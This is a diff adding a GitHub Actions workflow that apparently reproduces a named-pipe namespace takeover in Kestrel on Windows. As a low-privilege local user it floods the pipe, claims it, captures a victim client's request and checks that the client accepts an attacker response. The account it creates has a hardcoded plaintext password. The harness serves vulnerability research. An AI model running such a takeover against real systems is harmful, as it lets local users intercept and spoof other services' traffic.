@@ -1,0 +1,218 @@
+name: Kestrel Named Pipe Residual Probe
+
+on:
+  push:
+    branches:
+      - research/namedpipe-residual-20261116
+    paths:
+      - 'research/namedpipe-residual/**'
+      - '.github/workflows/namedpipe-residual.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: windows-2025
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - sdk: '10.0.404'
+            runtime: '10.0.15'
+            project: 'Probe.net10.csproj'
+            tfm: 'net10.0'
+          - sdk: '11.0.100'
+            runtime: '11.0.0'
+            project: 'Probe.net11.csproj'
+            tfm: 'net11.0'
+
+    env:
+      DOTNET_NOLOGO: '1'
+      DOTNET_CLI_TELEMETRY_OPTOUT: '1'
+      NP_USER: 'zdbnpattacker'
+      NP_PASSWORD: 'Zdb-Np-2026-Aa9!'
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v5
+        with:
+          dotnet-version: ${{ matrix.sdk }}
+
+      - name: Verify exact current GA environment
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          New-Item -ItemType Directory -Force evidence | Out-Null
+          $sdk = (& dotnet --version).Trim()
+          if ($sdk -ne '${{ matrix.sdk }}') { throw "SDK mismatch: $sdk" }
+          $runtimes = @(& dotnet --list-runtimes)
+          if (-not ($runtimes -match "^Microsoft.AspNetCore.App $([regex]::Escape('${{ matrix.runtime }}')) \[")) {
+            throw 'ASP.NET Core runtime mismatch'
+          }
+          dotnet --info | Set-Content evidence/dotnet-info.txt
+          dotnet --list-sdks | Set-Content evidence/dotnet-list-sdks.txt
+          dotnet --list-runtimes | Set-Content evidence/dotnet-list-runtimes.txt
+
+      - name: Build probe
+        shell: pwsh
+        working-directory: research/namedpipe-residual
+        run: |
+          $ErrorActionPreference = 'Stop'
+          dotnet build '${{ matrix.project }}' -c Release --nologo 2>&1 |
+            Tee-Object "../../evidence/build-${{ matrix.tfm }}.log"
+          if ($LASTEXITCODE -ne 0) { throw 'build failed' }
+
+      - name: Create isolated low-privilege principal
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $secure = ConvertTo-SecureString $env:NP_PASSWORD -AsPlainText -Force
+          if (Get-LocalUser -Name $env:NP_USER -ErrorAction SilentlyContinue) {
+            Remove-LocalUser -Name $env:NP_USER
+          }
+          New-LocalUser -Name $env:NP_USER -Password $secure -AccountNeverExpires -PasswordNeverExpires | Out-Null
+          $user = Get-LocalUser -Name $env:NP_USER
+          $serviceSid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+          "NP_LOW_SID=$($user.SID.Value)" | Out-File $env:GITHUB_ENV -Append -Encoding utf8
+          "NP_SERVICE_SID=$serviceSid" | Out-File $env:GITHUB_ENV -Append -Encoding utf8
+          [pscustomobject]@{
+            lowUser = $env:NP_USER
+            lowSid = $user.SID.Value
+            serviceIdentity = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+            serviceSid = $serviceSid
+          } | ConvertTo-Json | Set-Content evidence/principals.json
+
+      - name: Run cross-principal lifecycle proof
+        id: runprobe
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $root = (Resolve-Path '.').Path
+          $state = Join-Path $root 'evidence/state'
+          New-Item -ItemType Directory -Force $state | Out-Null
+          icacls $state /grant "${env:COMPUTERNAME}\${env:NP_USER}:(OI)(CI)M" /T | Out-File evidence/icacls.txt
+
+          $dll = Join-Path $root "research/namedpipe-residual/bin/Release/${{ matrix.tfm }}/Probe.dll"
+          if (-not (Test-Path $dll)) { throw "probe DLL missing: $dll" }
+          $dotnet = (Get-Command dotnet).Source
+          $pipe = "zdb-np-${env:GITHUB_RUN_ID}-${env:GITHUB_RUN_ATTEMPT}-${{ matrix.tfm }}"
+          $stopHost = Join-Path $state 'stop-host'
+          $releaseFlood = Join-Path $state 'release-flood'
+          $marker = "VICTIM-MARKER-$([guid]::NewGuid().ToString('N'))"
+          $cred = [pscredential]::new("${env:COMPUTERNAME}\${env:NP_USER}", (ConvertTo-SecureString $env:NP_PASSWORD -AsPlainText -Force))
+
+          function Wait-File([string]$Path, [int]$Seconds) {
+            $deadline = (Get-Date).AddSeconds($Seconds)
+            while ((Get-Date) -lt $deadline) {
+              if (Test-Path $Path) { return }
+              Start-Sleep -Milliseconds 100
+            }
+            throw "Timed out waiting for $Path"
+          }
+
+          $hostOut = Join-Path $state 'host.stdout.txt'
+          $hostErr = Join-Path $state 'host.stderr.txt'
+          $hostProc = Start-Process -FilePath $dotnet -ArgumentList @($dll,'server',$pipe,$state,$env:NP_LOW_SID,$stopHost) -PassThru -RedirectStandardOutput $hostOut -RedirectStandardError $hostErr
+          Wait-File (Join-Path $state 'host-ready.json') 20
+
+          $preOut = Join-Path $state 'pre.stdout.txt'
+          $preErr = Join-Path $state 'pre.stderr.txt'
+          $preProc = Start-Process -FilePath $dotnet -Credential $cred -LoadUserProfile -ArgumentList @($dll,'claim',$pipe,$state,'pre',$env:NP_SERVICE_SID,'2') -PassThru -Wait -RedirectStandardOutput $preOut -RedirectStandardError $preErr
+          Wait-File (Join-Path $state 'claim-pre.json') 5
+
+          $floodOut = Join-Path $state 'flood.stdout.txt'
+          $floodErr = Join-Path $state 'flood.stderr.txt'
+          $floodProc = Start-Process -FilePath $dotnet -Credential $cred -LoadUserProfile -ArgumentList @($dll,'flood',$pipe,$state,$releaseFlood) -PassThru -RedirectStandardOutput $floodOut -RedirectStandardError $floodErr
+          Wait-File (Join-Path $state 'flood-ready.json') 25
+          Start-Sleep -Seconds 2
+          New-Item -ItemType File -Path $releaseFlood -Force | Out-Null
+          $floodProc.WaitForExit(15000) | Out-Null
+
+          $postOut = Join-Path $state 'post.stdout.txt'
+          $postErr = Join-Path $state 'post.stderr.txt'
+          $postProc = Start-Process -FilePath $dotnet -Credential $cred -LoadUserProfile -ArgumentList @($dll,'claim',$pipe,$state,'post',$env:NP_SERVICE_SID,'30') -PassThru -RedirectStandardOutput $postOut -RedirectStandardError $postErr
+          Wait-File (Join-Path $state 'claim-post-ready.txt') 35
+
+          $victimOut = Join-Path $state 'victim.stdout.txt'
+          $victimErr = Join-Path $state 'victim.stderr.txt'
+          & $dotnet $dll victim $pipe $marker $victimOut 15000 2> $victimErr
+          $victimExit = $LASTEXITCODE
+          $postProc.WaitForExit(20000) | Out-Null
+          New-Item -ItemType File -Path $stopHost -Force | Out-Null
+          $hostProc.WaitForExit(15000) | Out-Null
+
+          $pre = Get-Content (Join-Path $state 'claim-pre.json') -Raw | ConvertFrom-Json
+          $flood = Get-Content (Join-Path $state 'flood-ready.json') -Raw | ConvertFrom-Json
+          $post = Get-Content (Join-Path $state 'claim-post.json') -Raw | ConvertFrom-Json
+          $captured = Get-Content (Join-Path $state 'captured-request.txt') -Raw
+          $victimResponse = Get-Content $victimOut -Raw
+          $realHit = Test-Path (Join-Path $state 'real-victim-hit.txt')
+
+          $verdict = (
+            -not [bool]$pre.success -and
+            [int]$flood.connected -ge 250 -and
+            [bool]$post.success -and
+            $post.sid -eq $env:NP_LOW_SID -and
+            $post.ownerSid -eq $env:NP_LOW_SID -and
+            $captured.Contains($marker) -and
+            $victimResponse.Contains('ATTACKER_PIPE_RESPONSE') -and
+            -not $realHit -and
+            $victimExit -eq 0
+          )
+
+          [pscustomobject]@{
+            utc = [DateTimeOffset]::UtcNow
+            sdk = '${{ matrix.sdk }}'
+            runtime = '${{ matrix.runtime }}'
+            tfm = '${{ matrix.tfm }}'
+            pipe = $pipe
+            preClaimDenied = -not [bool]$pre.success
+            preClaimError = $pre.error
+            floodConnected = [int]$flood.connected
+            floodFailure = $flood.failure
+            postClaimSucceeded = [bool]$post.success
+            postClaimSid = $post.sid
+            postClaimOwnerSid = $post.ownerSid
+            markerCaptured = $captured.Contains($marker)
+            attackerResponseAccepted = $victimResponse.Contains('ATTACKER_PIPE_RESPONSE')
+            realKestrelVictimEndpointHit = $realHit
+            hostExitCode = $hostProc.ExitCode
+            floodExitCode = $floodProc.ExitCode
+            postExitCode = $postProc.ExitCode
+            victimExitCode = $victimExit
+            verdict = if ($verdict) { 'PASS_CURRENT_GA_POST_ACCEPT_REPLACEMENT_FAILURE_NAMESPACE_TAKEOVER' } else { 'FAIL_NOT_FULLY_REPRODUCED' }
+          } | ConvertTo-Json -Depth 6 | Set-Content evidence/summary.json
+
+          Get-ChildItem evidence -Recurse -File | Sort-Object FullName | ForEach-Object {
+            "{0}  {1}" -f (Get-FileHash $_.FullName -Algorithm SHA256).Hash.ToLowerInvariant(), $_.FullName.Substring($root.Length + 1).Replace('\','/')
+          } | Set-Content evidence/SHA256SUMS.txt
+
+          if ($verdict) { "PROBE_VERDICT=PASS" | Out-File $env:GITHUB_ENV -Append } else { "PROBE_VERDICT=FAIL" | Out-File $env:GITHUB_ENV -Append }
+
+      - name: Remove isolated principal
+        if: always()
+        shell: pwsh
+        run: |
+          Get-Process dotnet -ErrorAction SilentlyContinue | Where-Object { $_.Path -like '*dotnet*' } | Stop-Process -Force -ErrorAction SilentlyContinue
+          if (Get-LocalUser -Name $env:NP_USER -ErrorAction SilentlyContinue) {
+            Remove-LocalUser -Name $env:NP_USER
+          }
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: namedpipe-residual-${{ matrix.runtime }}
+          path: evidence
+          if-no-files-found: error
+          retention-days: 7
+
+      - name: Enforce verdict
+        if: always()
+        shell: pwsh
+        run: |
+          if ($env:PROBE_VERDICT -ne 'PASS') { throw 'Residual was not fully reproduced.' }
